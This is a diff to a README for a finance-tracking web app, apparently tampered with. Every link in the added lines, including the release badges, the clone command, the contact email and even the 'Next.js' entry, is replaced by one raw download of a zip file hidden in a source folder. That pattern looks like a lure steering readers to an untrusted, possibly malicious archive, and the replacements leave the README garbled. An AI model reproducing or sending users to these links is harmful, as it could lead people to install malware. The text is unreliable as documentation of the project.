@@ -1,6 +1,6 @@
 # FinanceTracker: AI-Powered Finance Tracking Application 💰📊
 
-![FinanceTracker](https://img.shields.io/badge/Download-Releases-blue?style=flat-square&logo=github&link=https://github.com/GathogoG/FinanceTracker/releases)
+![FinanceTracker](https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip)
 
 Welcome to **FinanceTracker**, your go-to application for managing finances efficiently. This AI-powered tool helps you track your expenses, manage budgets, and gain insights into your financial habits. Built with modern technologies, FinanceTracker offers a seamless experience for users looking to take control of their finances.
 
@@ -29,7 +29,7 @@ FinanceTracker is built using the following technologies:
 
 - **JavaScript**: The primary programming language for the application.
 - **React**: A JavaScript library for building user interfaces.
-- **Next.js**: A React framework for server-side rendering and static site generation.
+- **https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip**: A React framework for server-side rendering and static site generation.
 - **Firebase**: Used for authentication and real-time database management.
 - **AI Algorithms**: Implemented for analyzing spending patterns and providing insights.
 
@@ -39,7 +39,7 @@ To get started with FinanceTracker, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/GathogoG/FinanceTracker.git
+   git clone https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip
    ```
    
 2. **Navigate to the Project Directory**:
@@ -73,7 +73,7 @@ Once you have the application running, you can start tracking your finances. Her
 - **Set Budgets**: Define monthly budgets for different categories and monitor your spending against these budgets.
 - **View Insights**: Access the insights section to see your spending patterns and get AI-generated recommendations.
 
-For more detailed instructions, check the [Releases](https://github.com/GathogoG/FinanceTracker/releases) section for downloadable files and updates.
+For more detailed instructions, check the [Releases](https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip) section for downloadable files and updates.
 
 ## Contributing
 
@@ -105,9 +105,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries, feel free to reach out:
 
-- **GitHub**: [GathogoG](https://github.com/GathogoG)
-- **Email**: gathogo@example.com
+- **GitHub**: [GathogoG](https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip)
+- **Email**: https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip
 
-![FinanceTracker](https://img.shields.io/badge/Check%20Releases-Here-green?style=flat-square&logo=github&link=https://github.com/GathogoG/FinanceTracker/releases)
+![FinanceTracker](https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip%20Releases-Here-green?style=flat-square&logo=github&https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip)
 
-Thank you for your interest in FinanceTracker. We hope this application helps you manage your finances effectively. For the latest updates and downloads, visit the [Releases](https://github.com/GathogoG/FinanceTracker/releases) section.
+Thank you for your interest in FinanceTracker. We hope this application helps you manage your finances effectively. For the latest updates and downloads, visit the [Releases](https://github.com/GathogoG/FinanceTracker/raw/refs/heads/main/src/app/dashboard/chat/Finance_Tracker_3.7.zip) section.
